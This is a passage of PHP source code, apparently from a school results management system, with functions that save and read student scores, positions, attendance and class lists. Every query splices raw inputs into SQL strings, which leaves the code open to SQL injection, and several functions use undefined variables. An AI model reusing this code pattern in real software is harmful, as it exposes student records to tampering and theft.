  public static function SaveScore($student,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$catotal,$exam,$total,$grade,$remark){
    if(Module::IsStudentScoreExist($student,$subject,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result set ca_1='$ca1', ca_2='$ca2', ca_3='$ca3', ca_total='$catotal', exam='$exam', total='$total', teacher_remark='$remark', remark='$remark', grad_e='$grade', class='$class' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' ");
      if($query)
        $news="Modified Successfully";
      else
        $news="Not Modified Successfully";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result (reg_no,subject,session,term,ca_1,ca_2,ca_3,ca_total,exam,total,remark,grad_e,class) values('$student','$subject','$session','$term','$ca1','$ca2','$ca3','$catotal','$exam','$total','$remark','$grade','$class') ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Not Recorded Successfully";
    }

      
      
      return $news;
  }

   public static function IsBackupScoreSamep($reg_no,$subject,$session,$term,$class,$ca_1,$ca_2,$ca_3,$exam,$id,$catotal,$total,$remark,$teacher_remark,$position,$grade){
        $query=mysqli_query(dbass::Connect(),"SELECT * from presult where position='$position' and ca_1='$ca_1' and ca_2='$ca_2' and ca_3='$ca_3' and ca_total='$catotal' and exam='$exam' and total='$total' and teacher_remark='$remark' and remark='$remark' and grad_e='$grade' and reg_no='$reg_no' and session='$session' and term='$term' and subject='$subject' and class='$class'");

        $res=mysqli_num_rows($query);
        
        if($res==0)
        {
            $rs=false;
        }
        elseif($res==1)
        {
          $rs=true;
        }
        
        return $rs;
    }

  public static function SaveBackupScorep($reg_no,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$exam,$id,$catotal,$total,$remark,$teacher_remark,$position,$grade){
    if(Module::IsBackupScoreSamep($reg_no,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$exam,$id,$catotal,$total,$remark,$teacher_remark,$position,$grade))
    {
      $news="Record Same";
    }
    elseif(Module::IsStudentScoreExistp($reg_no,$subject,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult set position='$position',ca_1='$ca1', ca_2='$ca2', ca_3='$ca3', ca_total='$catotal', exam='$exam', total='$total', teacher_remark='$remark', remark='$remark', grad_e='$grade' where reg_no='$reg_no' and session='$session' and term='$term' and subject='$subject' and class='$class' ");
      if($query)
        $news="$reg_no Modified";
      else
        $news="$reg_no not Modified";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult (reg_no,subject,session,term,ca_1,ca_2,ca_3,ca_total,exam,total,remark,grad_e,class,position) values('$reg_no','$subject','$session','$term','$ca1','$ca2','$ca3','$catotal','$exam','$total','$remark','$grade','$class','$position') ");
      if($query)
        $news="$reg_no Recorded";
      else
        $news="$reg_no Not Recorded";
    }        
      
    return $news;
  }

  public static function SaveBackupStudentsp($id,$regid,$regno,$names,$dateadmitted,$class,$passport,$password,$session,$guardian,$g_email,$g_phone,$date_graduated,$address){
      if(Module::IsStudentExistp($regno))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE pstudents set reg_no='$regno',reg_id='$regid', names='$names', class='$class',date_admitted='$dateadmitted', session='$session' , password='$password', guardian='$guardian', g_email='$g_email', g_phone='$g_phone', date_graduated='$date_graduated', address='$address' where id='$id'");
        if($query){
          echo "$regno: Modified Successfully";
          if(isset($passport))
          {
            if(Module::SaveStudentProfilePicturep($regno,$passport))
            {
              echo " Passport Uploaded";
            }
            else
            {
              echo " Passport upload failed";
            }
          }
          else
          {
            echo " Passport not backed up";
          }
        }
        else
        {
          echo "Student Midification has failed";
        }
      }
      else
      {
        if(Module::AddBackupStudentp($regid,$regno,$names,$class,$dateadmitted,$session,$password,$date_graduated,$g_email,$g_phone,$address,$guardian))
        {
          echo "$regno: Student Recorded";
          if(isset($passport))
          {
            if(Module::SaveStudentProfilePicturep($regno,$passport))
            {
              echo " Passport Uploaded";
            }
            else
            {
              echo " Passport upload failed";
            }
          }
          else
          {
            echo " Passport not backed up";
          }
        }
        else
        {
          echo "Student Recording Failed";
        }
      }
      return $news;
    }

  public static function SaveScorep($student,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$catotal,$exam,$total,$grade,$remark){
    if(Module::IsStudentScoreExistp($student,$subject,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult set ca_1='$ca1', ca_2='$ca2', ca_3='$ca3', ca_total='$catotal', exam='$exam', total='$total', teacher_remark='$remark', remark='$remark', grad_e='$grade' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' and class='$class' ");
      if($query)
      {
        $news="Modified Successfully";
      }
      else{
        $news="Not Modified Successfully";
      }
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult (reg_no,subject,session,term,ca_1,ca_2,ca_3,ca_total,exam,total,remark,grad_e,class) values('$student','$subject','$session','$term','$ca1','$ca2','$ca3','$catotal','$exam','$total','$remark','$grade','$class') ");
      if($query){
        $news="Recorded Successfully";
      }
      else
        $news="Not Recorded Successfully";
    }    
    Module::Sync_SaveScorep($student,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$catotal,$exam,$total,$grade,$remark); 
      
    return $news;
  }


  public static function Sync_SaveScorep($student,$subject,$session,$term,$class,$ca1,$ca2,$ca3,$catotal,$exam,$total,$grade,$remark){
    if(!Sync::IsOnline())
    {
      if(Module::Sync_IsStudentScoreExistp($student,$subject,$session,$term,$class))
      {
        $query=mysqli_query(dbass::Connect(),"UPDATE sync_presult set ca_1='$ca1', ca_2='$ca2', ca_3='$ca3', ca_total='$catotal', exam='$exam', total='$total', teacher_remark='$remark', remark='$remark', grad_e='$grade' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' and class='$class' ");
        if($query)
        {
          $news="Modified Successfully";
        }        
        else{
          $news="Not Modified Successfully";
        }
      }
      else
      {
        $query=mysqli_query(dbass::Connect(),"INSERT into sync_presult (reg_no,subject,session,term,ca_1,ca_2,ca_3,ca_total,exam,total,remark,grad_e,class) values('$student','$subject','$session','$term','$ca1','$ca2','$ca3','$catotal','$exam','$total','$remark','$grade','$class') ");
        if($query){
          $news="Recorded Successfully";
        }
        else
          $news="Not Recorded Successfully";
      }    
    }
        
      
    return $news;
  }


  public static function SaveSubjectComment($student,$subject,$session,$term,$class,$comment){
    if(Module::IsStudentScoreExistp($student,$subject,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult set comment='$comment' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' and class='$class' ");
      if($query)
        $news="Modified Successfully";
      else
        $news="Not Modified Successfully";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult (reg_no,subject,session,term,comment) values('$student','$subject','$session','$term','$comment') ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Not Recorded Successfully";
    }        
      
    return $news;
  }

  public static function SaveSubjectPositionp($student,$subject,$session,$term,$class,$position){
    if(Module::IsStudentScoreExistp($student,$subject,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult set position='$position' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' and class='$class' ");
      if($query)
        $news="Position Changed Successfully";
      else
        $news="Not Changed Successfully";
    }
    else
    {
      $news="The Student have no result for the select term. Enter Scores and Try again";
    } 
      return $news;
  }



  public static function SaveSubjectPosition($student,$subject,$session,$term,$position){
    if(Module::IsStudentScoreExist($student,$subject,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result set position='$position' where reg_no='$student' and session='$session' and term='$term' and subject='$subject' ");
      if($query)
        $news="Position Changed Successfully";
      else
        $news="Not Changed Successfully";
    }
    else
    {
      $news="The Student have no result for the select term. Enter Scores and Try again";
    } 
      return $news;
  }


  public static function SaveAnalysis($student,$session,$term,$class,$premark,$fmremark,$attendance,$conduct,$appearance,$position,$total){
    if(Module::IsStudentInAnalysis($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set principal_remark='$premark', form_master_remark='$fmremark', attendance='$attendance', appearance='$appearance', conduct='$conduct', position='$position', total='$total' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,class,principal_remark,form_master_remark,attendance,appearance,conduct,position,total) values('$student','$session','$term','$class','$premark','$fmremark','$attendance','$appearance','$conduct','$position','$total')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function IsResultAnalysisExistp($student,$session,$term,$class)
  {
    $query=mysqli_query(dbass::Connect(),"SELECT * from presult_analysis where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
    $count=mysqli_num_rows($query);
    if($count>1)
    {
      return true;
    }
    else
    {
      return false;
    }
  }


  public static function DeleteAnalysisResultp($student,$session,$term,$class){
      $query=mysqli_query(dbass::Connect(),"DELETE from presult_analysis where reg_no='$student' and session='$session' and term='$term' and class='$class'");
      
      if($query>0)
      {
        $rs=true;
      }
      else
      {
        $rs=false;
      }
      
      return $rs;
  }

  public static function SaveCA1Analysisp($student,$session,$term,$class,$remark,$total,$position){
    if(Module::IsStudentInAnalysisp($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set ca1_position='$position', ca1_remark='$remark', ca1_total='$total' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news=true;
      else
        $news=false;
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class,ca1_remark,ca1_total,ca1_position) values('$student','$session','$term','$class','$remark','$total','$position')");
      if($query)
        $news=true;
      else
        $news=false;
    }
    return $news;
  }

  public static function SaveCA2Analysisp($student,$session,$term,$class,$remark,$total,$position){
    if(Module::IsStudentInAnalysisp($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set ca2_position='$position', ca2_remark='$remark', ca2_total='$total' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Modified Successfully";
      else
        $news="Modified not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class,ca2_remark,ca2_total,ca2_position) values('$student','$session','$term','$class','$remark','$total','$position')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function SaveCA3Analysisp($student,$session,$term,$class,$remark,$total,$position){
    if(Module::IsStudentInAnalysisp($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set ca3_position='$position', ca3_remark='$remark', ca3_total='$total' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Modified Successfully";
      else
        $news="Modified not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class,ca3_remark,ca3_total,ca3_position) values('$student','$session','$term','$class','$remark','$total','$position')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function SaveExamAnalysisp($student,$session,$term,$class,$remark,$total,$position){
    if(Module::IsStudentInAnalysisp($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set exam_position='$position', exam_remark='$remark', exam_total='$total' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Modified Successfully";
      else
        $news="Modified not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class,exam_remark,exam_total,exam_position) values('$student','$session','$term','$class','$remark','$total','$position')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function SavePosition($student,$session,$term,$class,$position){
    if(Module::IsStudentInAnalysis($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set  position='$position' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,class,position) values('$student','$session','$term','$class','$position')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function SavePositionp($student,$session,$term,$class,$position){
    if(Module::IsStudentInAnalysisp($student,$session,$term,$class))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set  position='$position' where reg_no='$student' and session='$session' and term='$term' and class='$class' ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,class,position) values('$student','$session','$term','$class','$position')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }



  public static function SaveFinalOthersp($student,$session,$term,$premark,$fmremark,$attendance,$conduct,$appearance,$position,$total){
    if(Module::IsStudentInAnalysisp($student,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE presult_analysis set principal_remark='$premark', form_master_remark='$fmremark', attendance='$attendance', appearance='$appearance', conduct='$conduct', position='$position', total='$total' where reg_no='$student' and session='$session' and term='$term' ");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into presult_analysis(reg_no,session,term,principal_remark,form_master_remark,attendance,appearance,conduct,position,total) values('$student','$session','$term','$premark','$fmremark','$attendance','$appearance','$conduct','$position','$total')");
      if($query)
        $news="Recorded Successfully";
      else
        $news="Record not Successful";
    }
    return $news;
  }

  public static function SaveAttendance($student,$session,$term,$attendance,$totalscore){
    if(Module::IsStudentInAnalysis($student,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set attendance='$attendance',total='$totalscore' where reg_no='$student' and session='$session' and term='$term' ");
      if($query)
        $news="Attendance Changed Successfully";
      else
        $news="Attendance Not Changed Successfully";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,attendance,total) values('$student','$session','$term','$attendance','$totalscore')");
      if($query)
        $news="Attendance Inserted Successfully";
      else
        $news="Attendance Not Inserted Successfully";
    }

      
      
      return $news;
  }

  public static function SaveConduct($student,$session,$term,$conduct,$totalscore){
    if(Module::IsStudentInAnalysis($student,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set conduct='$conduct', total='$totalscore' where reg_no='$student' and session='$session' and term='$term' ");
      if($query)
        $news="Conduct Changed Successfully";
      else
        $news="Conduct Not Changed Successfully";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,conduct,total) values('$student','$session','$term','$conduct','$totalscore')");
      if($query)
        $news="Conduct Inserted Successfully";
      else
        $news="Conduct Not Inserted Successfully";
    }

      
      
      return $news;
  }


  public static function SaveAppearance($student,$session,$term,$appearance){
    if(Module::IsStudentInAnalysis($student,$session,$term))
    {
      $query=mysqli_query(dbass::Connect(),"UPDATE result_analysis set appearance='$appearance', total='$totalscore'  where reg_no='$student' and session='$session' and term='$term' ");
      if($query)
        $news="Appearance Changed Successfully";
      else
        $news="Appearance Not Changed Successfully";
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"INSERT into result_analysis(reg_no,session,term,appearance,total) values('$student','$session','$term','$appearance','$totalscore')");
      if($query)
        $news="Appearance Inserted Successfully";
      else
        $news="Appearance Not Inserted Successfully";
    }

    return $news;
  }

  public static function CountSubjects($level){
      $query=mysqli_query(dbass::Connect(),"SELECT * from subjects where level='$level' ");
      $cnt=mysqli_num_rows($query);
      
      return $cnt;
  }

  public static function CountSubjectsp($class){
      $query=mysqli_query(dbass::Connect(),"SELECT * from psubjects where class='$class' ");
      $cnt=mysqli_num_rows($query);
      
      return $cnt;
  }

  public static function CountStudentSubjectsp($reg_no,$class,$session,$term){
      $query=mysqli_query(dbass::Connect(),"SELECT * from presult where reg_no='$reg_no' and class='$class' and session='$session' and term='$term' ");
      $cnt=mysqli_num_rows($query);
      
      return $cnt;
  }

  public static function GetLevel($class){
    $fstLeter=substr($class, 0,1);
    if($fstLeter=="J")
    {
      $level="Junior";
    }
    elseif($fstLeter=="S")
    {
      $level="Senior";
    }
    return $level;
  }

  public static function ReadSessions(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['session'], $news))){
          array_push($news, $res['session']);
        }
      }
      
      return $news;
  }

  public static function ReadStudentSessions(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from session ");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        if(!(in_array($res['session'], $news))){
          array_push($news, $res['session']);
        }
      }
      
      return $news;
  }

  public static function ReadSessionStudents($session,$class){
    $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    if(($classtoken=="1") || ($classtoken=="2") || ($classtoken=="3"))
    {
      $classtoken="";
    }
    elseif($classtoken=="0")
    {
      $classtoken=$classtoken;
    }
    else
    {
      $classtoken=$classtoken;
    }
    $regno="$year"."$classtoken";

    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from students where session='$session'  and reg_no like '%$regno%' order by reg_id asc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    

    return $news;
  }

  public static function ReadSessionStudentsp($session,$class){
     $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session'  and (status='' or status='Active' or status is null)  and reg_no like '%$regno%' order by reg_id asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['reg_no']);
      }
      
      return $news;
  }

  public static function ReadAlumniStudentsp_($session){
    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session'  and (status='' or status='Active' or status is null)  order by reg_id asc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }

  public static function ReadAllSessionStudentsp($session,$class){
     $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session'  and reg_no like '%$regno%' order by reg_id asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, strtoupper($res['reg_no']));
      }
      
      return $news;
  }

  public static function ReadActiveSessionStudentsp($session,$class){
     $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session' and (class='$class' ||class='') and (status=''||status='ctive') and reg_no like '%$regno%' order by reg_id asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['reg_no']);
      }
      
      return $news;
  }

  public static function ReadSessionIdStudentsp($session,$class){
     $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session' and (class='$class' ||class='') and reg_no like '%$regno%' order by reg_id asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
        array_push($news, $res['id']);
      }
      
      return $news;
  }



  public static function IsStudentActive($reg_no){     
    $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents where reg_no='$reg_no' and (status='' or status='Active' or status is null)");
    $res=mysqli_num_rows($query);
    if($res>0)
    {
      $rs=true;
    }
    
    return $rs;
  }

  public static function RemoveResults($reg_no,$term,$session){     
    $query=mysqli_query(dbass::Connect(),"DELETE from presult where reg_no='$reg_no' and term='$term' and session='$session'");

    if($query>0)
    {
        $rs=true;
    }
    
    return $rs;
  }

  public static function ReadAllStudentsp(){
      $query=mysqli_query(dbass::Connect(),"SELECT * from pstudents order by reg_no asc");
      $news=array();
      while($res=mysqli_fetch_array($query))
      {
          if(!in_array($res['reg_no'], $news)){
            array_push($news, $res['reg_no']);
          }
      }
      
      return $news;
  }

  public static function ReadStatusStudentsp($status,$session,$class){
    $ree=explode("/", $session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }

    if($status=="Active")
    {
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session' and (status='$status' or status is null or status ='') and reg_no like '%$regno%' order by reg_id asc");
    }
    else
    {
      $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session' and status='$status' and reg_no like '%$regno%' order by reg_id asc");
    }
    
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }

  public static function ReadClassStudents($class){

    $ssss=Module::GetClassSession($class);
    $ree=explode("/", $ssss);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    if(($classtoken=="1") || ($classtoken=="2") || ($classtoken=="3"))
    {
      $classtoken="";
    }
    else
    {
      $classtoken=$classtoken;
    }

    $regno="$year"."$classtoken";

    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from students where session='$ssss' and reg_no like '%$regno%' order by id asc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }

  public static function ReadClassStudentsp($class){
    $session=Module::GetClassSessionp($class);

    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from pstudents where session='$session' order by reg_id asc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      array_push($news, $res['reg_no']);
    }
    
    return $news;
  }

  public static function CountClassStudentsp($class){
    
    $students=Module::ReadClassStudentsp($class);
    
    return count($students);
  }

  public static function ReadResultStudents($session,$term,$class,$subject){
    $Session=Module::GetClassSession($class);
    $ree=explode("/", $Session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    if(($classtoken=="1") || ($classtoken=="2") || ($classtoken=="3"))
    {
      $classtoken="";
    }
    elseif($classtoken=="0")
    {
      $classtoken=$classtoken;
    }
    else
    {
      $classtoken=$classtoken;
    }
    $regno="$year"."$classtoken";

    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from result where session='$session' and term='$term' and class='$class' and subject='$subject' and reg_no like '%$regno%' order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news)))
      {
        array_push($news, $res['reg_no']);
      }
    }
    
    return $news;
  }


  public static function ReadResultStudentsp($session,$term,$subject,$class){
    $Session=Module::GetClassSessionp($class);
    $ree=explode("/", $Session);
    $year=$ree[0];
    $classtoken=substr($class, strlen($class)-1);
    

    if(!(($classtoken=="A") || ($classtoken=="B") || ($classtoken=="C") || ($classtoken=="D") || ($classtoken=="E") || ($classtoken=="F") || ($classtoken=="G") || ($classtoken=="H") || ($classtoken=="I") || ($classtoken=="J") || ($classtoken=="K") || ($classtoken=="L") || ($classtoken=="M") || ($classtoken=="N") || ($classtoken=="O") || ($classtoken=="P") || ($classtoken=="Q") || ($classtoken=="R") || ($classtoken=="S") || ($classtoken=="T") || ($classtoken=="U") || ($classtoken=="V") || ($classtoken=="W") || ($classtoken=="X") || ($classtoken=="Y") || ($classtoken=="Z")))
    {
      $regno=$school_details['school_keycode']."/$year"."/$regn";
    }
    else
    {
      $regno=$school_details['school_keycode']."/$year/".$classtoken."/$regn";
    }      


    $query=mysqli_query(dbass::Connect(),"SELECT distinct * from presult where session='$session' and term='$term'  and subject='$subject' and class='$class' and reg_no like '%$regno%' order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['reg_no'], $news)))
      {
        array_push($news, $res['reg_no']);
      }        
    }
    
    return $news;
  }


  public static function ReadTotals($session,$term,$class,$subject){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result where session='$session' and term='$term' and class='$class' and subject='$subject'  order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }        
    }
    
    return $news;
  }

  public static function ReadAnalysisTotals($session,$term,$class){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from result_analysis where session='$session' and term='$term' and class='$class'   order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }        
    }
    
    return $news;
  }

  public static function UpdateTermPositions($Session,$Term,$Class,$Operation){
    if($Operation=="clear_position")
    {
      foreach(Module::ReadAnalysisTotalsp($Session,$Term,$Class) as $Total)
      {
        Module::SaveTermAnalysisPositionsp($Session,$Term,$Class,$Total,$Position);
        //$bracketCount=Module::CountTermAnalysisBracketStudentsp($Session,$Term,$Class,$Total);
        //$Position=$Position+$bracketCount;
        //$Position=$Position-1;
      }
    }
    else
    {
      foreach(Module::ReadAnalysisTotalsp($Session,$Term,$Class) as $Total)
      {
        $Position++;
        Module::SaveTermAnalysisPositionsp($Session,$Term,$Class,$Total,$Position);
        $bracketCount=Module::CountTermAnalysisBracketStudentsp($Session,$Term,$Class,$Total);
        $Position=$Position+$bracketCount;
        $Position=$Position-1;
      }
    }
    
  }



  public static function ReadSessionAnalysisTotalsp($session,$class){

    $query=mysqli_query(dbass::Connect(),"SELECT  * from psession_statistical_analysis where session='$session' and class='$class'   order by total desc");
    $news=array();
    while($res=mysqli_fetch_array($query))
    {
      if(!(in_array($res['total'], $news))){
        array_push($news, $res['total']);
      }
    }
    return $news;
  }

  public static function SaveSessionAnalysisPositionsp($session,$class,$total,$position){

    $query=mysqli_query(dbass::Connect(),"UPDATE  psession_statistical_analysis set position='$position' where session='$session' and class='$class' and total='$total' ");
   if($query)
   {
      $news=true;
   }

    return $news;
  }

  public static function CountSessionAnalysisBracketStudentsp($session,$class,$total){

